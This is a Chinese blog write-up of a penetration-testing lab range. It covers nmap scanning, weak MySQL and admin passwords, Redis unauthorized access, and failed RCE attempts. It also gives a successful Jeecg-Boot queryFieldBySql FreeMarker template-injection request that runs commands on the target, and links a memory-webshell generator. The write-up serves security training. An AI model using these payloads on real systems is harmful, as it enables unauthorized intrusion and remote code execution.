@@ -1,0 +1,1001 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>无限学习团队月靶场 - 076w - 0xExploit-安全洞见 | https://syst1m.cn</title>
+
+  
+    <meta name="description" content="外网信息收集12345678910111213141516namp：--min-rate 10000    10000速率来扫描-p-   全端口-p80,135    指定80，135端口扫描-sU   指定udp扫描-sT   指定tcp协议-sV   扫描服务版本-sC   默认脚本扫描-O    对操作系统和版本探测--script&#x3D;vuln   进行基础漏洞扫描nmap -p-  --">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无限学习团队月靶场">
+<meta property="og:url" content="http://example.com/2025/09/18/%E6%97%A0%E9%99%90%E5%AD%A6%E4%B9%A0%E5%9B%A2%E9%98%9F%E6%9C%88%E9%9D%B6%E5%9C%BA/">
+<meta property="og:site_name" content="076w - 0xExploit-安全洞见 | https:&#x2F;&#x2F;syst1m.cn">
+<meta property="og:description" content="外网信息收集12345678910111213141516namp：--min-rate 10000    10000速率来扫描-p-   全端口-p80,135    指定80，135端口扫描-sU   指定udp扫描-sT   指定tcp协议-sV   扫描服务版本-sC   默认脚本扫描-O    对操作系统和版本探测--script&#x3D;vuln   进行基础漏洞扫描nmap -p-  --">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png">
+<meta property="article:published_time" content="2025-09-17T23:19:44.000Z">
+<meta property="article:modified_time" content="2025-10-17T05:42:34.000Z">
+<meta property="article:author" content="076w">
+<meta property="article:tag" content="无镜靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png">
+  
+  
+  
+  <meta name="keywords" content="无镜靶场">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+    <link rel="shortcut icon" href="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"076w","sameAs":[],"image":"https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png"},"dateCreated":"2025-09-18T07:19:44+08:00","dateModified":"2025-10-17T13:42:34+08:00","datePublished":"2025-09-18T07:19:44+08:00","description":"","headline":"无限学习团队月靶场","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/09/18/%E6%97%A0%E9%99%90%E5%AD%A6%E4%B9%A0%E5%9B%A2%E9%98%9F%E6%9C%88%E9%9D%B6%E5%9C%BA/"},"publisher":{"@type":"Organization","name":"076w","sameAs":[],"image":"https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png","logo":{"@type":"ImageObject","url":"https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png"}},"url":"http://example.com/2025/09/18/%E6%97%A0%E9%99%90%E5%AD%A6%E4%B9%A0%E5%9B%A2%E9%98%9F%E6%9C%88%E9%9D%B6%E5%9C%BA/","keywords":"无镜靶场","image":[]}</script>
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/html/about"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">076w</div><div class="sub normal cap">0xExploit-安全洞见</div><div class="sub hover cap" style="opacity:0"> https://syst1m.cn</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" target="_blank" rel="noopener" href="https://www.yuque.com/076w/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" target="_blank" rel="noopener" href="https://www.yuque.com/076w/syst1m/xotgbd5f48rcllke?singleDoc#lark-mini-editor/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/09/18/%E6%97%A0%E9%99%90%E5%AD%A6%E4%B9%A0%E5%9B%A2%E9%98%9F%E6%9C%88%E9%9D%B6%E5%9C%BA/"><span class="title">无限学习团队月靶场</span></a><a class="item title" href="/2025/10/10/%E5%B0%86%E8%AF%AD%E9%9B%80%E6%96%87%E6%A1%A3%E5%86%85%E5%AE%B9%E5%90%8C%E6%AD%A5Hexo+Github/"><span class="title">将语雀文档内容同步Hexo+Github</span></a><a class="item title" href="/2025/06/22/%E6%9F%90%E9%80%9A%E7%94%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%AE%80%E5%8D%95%E4%BB%A3%E5%AE%A1/"><span class="title">某通用管理系统简单代审</span></a><a class="item title" href="/2023/08/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"><span class="title">文件上传绕过总结</span></a><a class="item title" href="/2025/09/20/(%E8%BD%AC%E8%BD%BD)MySQL%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83/"><span class="title">(转载)MySQL 漏洞利用与提权</span></a><a class="item title" href="/2025/03/29/Zer0sec%E9%9D%B6%E5%9C%BAwp/"><span class="title">Zer0sec靶场wp</span></a><a class="item title" href="/2025/07/14/%E8%87%B4%E8%BF%9C%20A8+%20V7%20XSS(CVE-2025-56451)/"><span class="title">致远 A8+ V7 XSS(CVE-2025-56451)</span></a><a class="item title" href="/2024/02/23/U%E9%AA%8C%E8%AF%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96(CVE-2024-26559)/"><span class="title">U验证任意文件读取(CVE-2024-26559)</span></a><a class="item title" href="/2023/11/01/Clicker_Medium/"><span class="title">Clicker_Medium</span></a><a class="item title" href="/2023/10/17/Giddy_Medium/"><span class="title">Giddy_Medium</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E7%AC%94%E8%AE%B0/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/">靶场日记</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E7%AC%94%E8%AE%B0/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/%E6%97%A0%E9%95%9C%E9%9D%B6%E5%9C%BA/">无镜靶场</a></div><div id="tag"> <span>&nbsp标签：</span><a class="cap breadcrumb-link" href="/tags/%E6%97%A0%E9%95%9C%E9%9D%B6%E5%9C%BA/">无镜靶场</a>&nbsp</div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-09-17T23:19:44.000Z">2025-09-18</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-10-17T05:42:34.000Z">2025-10-17</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>无限学习团队月靶场</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758180027029-a2236ee9-5f75-4926-a59e-db31a06174cf.png"></p>
+<h3 id="外网信息收集"><a href="#外网信息收集" class="headerlink" title="外网信息收集"></a><font style="color:rgb(51, 51, 51);">外网信息收集</font></h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">namp：</span><br><span class="line">--min-rate <span class="number">10000</span>    <span class="number">10000</span>速率来扫描</span><br><span class="line">-p-   全端口</span><br><span class="line">-p80,<span class="number">135</span>    指定<span class="number">80</span>，<span class="number">135</span>端口扫描</span><br><span class="line">-sU   指定udp扫描</span><br><span class="line">-sT   指定tcp协议</span><br><span class="line">-sV   扫描服务版本</span><br><span class="line">-sC   默认脚本扫描</span><br><span class="line">-O    对操作系统和版本探测</span><br><span class="line">--script=vuln   进行基础漏洞扫描</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nmap -p-  --min-rate <span class="number">10000</span>  <span class="number">192.168</span>.<span class="number">111.22</span></span><br><span class="line">nmap -p- -sU --min-rate <span class="number">10000</span>  <span class="number">192.168</span>.<span class="number">111.22</span></span><br><span class="line">nmap -p22,<span class="number">3306</span>,<span class="number">6379</span>,<span class="number">18088</span>,<span class="number">18080</span> --script=vuln <span class="number">192.168</span>.<span class="number">111.22</span></span><br><span class="line">nmap -p22,<span class="number">3306</span>,<span class="number">6379</span>,<span class="number">18088</span>,<span class="number">18080</span> -sV -sC -sT -O <span class="number">192.168</span>.<span class="number">111.22</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758182177521-12925e3c-cd88-42f1-875a-1e831ea3ac42.png"></p>
+<p>根据扫描结果开放端口为 SSH（22）、MySQL（3306）、Redis（6379）、Apache Tomcat 404（18088）、http（18080）</p>
+<h3 id="外网漏洞探测"><a href="#外网漏洞探测" class="headerlink" title="外网漏洞探测"></a>外网漏洞探测</h3><p>爆破 SSH（22）、MySQL（3306）、Redis（6379）</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758182245068-0eeafca5-d5bd-469a-8f6f-9ab029be3294.png"></p>
+<h4 id="MySQL弱口令"><a href="#MySQL弱口令" class="headerlink" title="MySQL弱口令"></a>MySQL弱口令</h4><p>192.168.111.22:3306   root&#x2F;root</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758182464942-6d368a8f-c7cb-425a-8425-15fdbac278c9.png"></p>
+<h4 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h4><p>192.168.111.22:6379</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758182660202-1b54e1b9-c4c9-4f96-918c-3c9c93b8cb98.png"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.22:18088/">http://192.168.111.22:18088/</a> 访问 404 扫扫目录</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758184078305-eef2c491-8b9b-4cdd-b798-d55807e70da4.png"></p>
+<h4 id="Web-系统"><a href="#Web-系统" class="headerlink" title="Web 系统"></a>Web 系统</h4><p><a target="_blank" rel="noopener" href="http://192.168.111.22:18088/jeecg-boot/jmreport/list">http://192.168.111.22:18088/jeecg-boot/jmreport/list</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758267908094-781f7311-19b5-4699-bacf-b2c6487d31f4.png"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.22:18080/">http://192.168.111.22:18080/</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758267933382-82cb97d4-ed1b-4e22-a0a9-a6e1a26c9dd5.png"></p>
+<h3 id="外网漏洞利用"><a href="#外网漏洞利用" class="headerlink" title="外网漏洞利用"></a>外网漏洞利用</h3><h4 id="MySQL-RCE-失败"><a href="#MySQL-RCE-失败" class="headerlink" title="MySQL RCE(失败)"></a>MySQL RCE(失败)</h4><p>关于 mysql 知识点可以参考国光的<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">MySQL 漏洞利用与提权</a></p>
+<p>失效访问<a target="_blank" rel="noopener" href="https://www.yuque.com/076w/syst1m/agqzxtrgp68qd4kp">MySQL 漏洞利用与提权(转载)</a></p>
+<p><code>show global variables like &#39;%secure_file_priv%&#39;;</code></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758345969393-2b768f79-5852-4e6c-bd0c-57f9cdf88394.png"></p>
+<table>
+<thead>
+<tr>
+<th><font style="color:rgb(76, 73, 72);">Value</font></th>
+<th><font style="color:rgb(76, 73, 72);">说明</font></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><font style="color:rgb(76, 73, 72);">NULL</font></td>
+<td><font style="color:rgb(76, 73, 72);">不允许导入或导出</font></td>
+</tr>
+<tr>
+<td><font style="color:rgb(76, 73, 72);">&#x2F;tmp</font></td>
+<td><font style="color:rgb(76, 73, 72);">只允许在 &#x2F;tmp 目录导入导出</font></td>
+</tr>
+<tr>
+<td><font style="color:rgb(76, 73, 72);">空</font></td>
+<td><font style="color:rgb(76, 73, 72);">不限制目录</font></td>
+</tr>
+</tbody></table>
+<h4 id="Redis-RCE-失败"><a href="#Redis-RCE-失败" class="headerlink" title="Redis  RCE(失败)"></a><font style="color:rgb(76, 73, 72);">Redis  RCE(失败)</font></h4><p>这里直接用<a target="_blank" rel="noopener" href="https://github.com/DeEpinGh0st/MDUT-Extend-Release">GitHub - DeEpinGh0st&#x2F;MDUT-Extend-Release: MDUT-Extend(扩展版本)</a>比较方便</p>
+<p>知识点：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12153">Redis未授权利用总结</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347202733-b4233164-fb74-4525-b145-5eaebe83a908.png"></p>
+<h4 id="DocToolkit-系统-RCE-失败"><a href="#DocToolkit-系统-RCE-失败" class="headerlink" title="DocToolkit 系统 RCE(失败)"></a><font style="color:rgb(76, 73, 72);">DocToolkit 系统 RCE(失败)</font></h4><p><a target="_blank" rel="noopener" href="http://192.168.111.22:18080/">http://192.168.111.22:18080/</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758267933382-82cb97d4-ed1b-4e22-a0a9-a6e1a26c9dd5.png"></p>
+<p>尝试上传，文件读取皆失败，存在弱口令但是页面未开发</p>
+<h5 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h5><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/doLogin HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">111.22</span>:<span class="number">18080</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">131.0</span>.<span class="number">6778.86</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=<span class="number">1758269454</span>,<span class="number">1758270382</span></span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">30</span></span><br><span class="line"></span><br><span class="line">username=admin&amp;password=<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758540902290-769a42ba-42a1-466d-b046-e9bbb4c0d965.png"></p>
+<p>登录时发现存在Shiro 框架，爆破密钥失败</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758541031787-603f44da-ddb4-4905-9dcc-7ce91579b093.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758541142399-2c726f68-74d4-481b-a235-a5372f71c145.png"></p>
+<h4 id="Jeecg-Boot-系统RCE-成功"><a href="#Jeecg-Boot-系统RCE-成功" class="headerlink" title="Jeecg-Boot 系统RCE(成功)"></a>Jeecg-Boot 系统RCE(成功)</h4><p><a target="_blank" rel="noopener" href="http://192.168.111.22:18088/jeecg-boot/jmreport/list">http://192.168.111.22:18088/jeecg-boot/jmreport/list</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758541313994-cf29e517-6ad3-4104-9be4-3273018f829d.png"></p>
+<p>直接打 nday，因为这里的任意文件上传上传后需要登录，所以选择 SSTI 模板注入</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/MInggongK/jeecg-">GitHub - MInggongK&#x2F;jeecg-: jeecg综合漏洞利用工具</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758719722582-fbe6965f-23dc-418c-96d9-d452749d2ad3.png"></p>
+<h5 id="queryFieldBySql-SSTI模板注入"><a href="#queryFieldBySql-SSTI模板注入" class="headerlink" title="queryFieldBySql SSTI模板注入"></a>queryFieldBySql SSTI模板注入</h5><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /jeecg-boot/jmreport/queryFieldBySql HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">111.22</span>:<span class="number">18088</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">131.0</span>.<span class="number">6778.86</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=<span class="number">1758269454</span>,<span class="number">1758270382</span></span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: <span class="number">99</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;sql&quot;</span>:<span class="string">&quot;select &#x27;&lt;#assign ex=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt; $&#123; ex(\&quot;whoami \&quot;) &#125;&#x27; &quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758541501063-0f41d253-c158-4e82-a3f9-00c0dda796ab.png"></p>
+<p>内存马<a target="_blank" rel="noopener" href="https://github.com/pen4uin/java-memshell-generator">GitHub - pen4uin&#x2F;java-memshell-generator: 一款支持自定义的 Java 内存马生成工具｜A customizable Java in-memory webshell generation tool.</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758720143414-3a5845d8-1ec5-4a6e-9320-03c99d59fecc.png"></p>
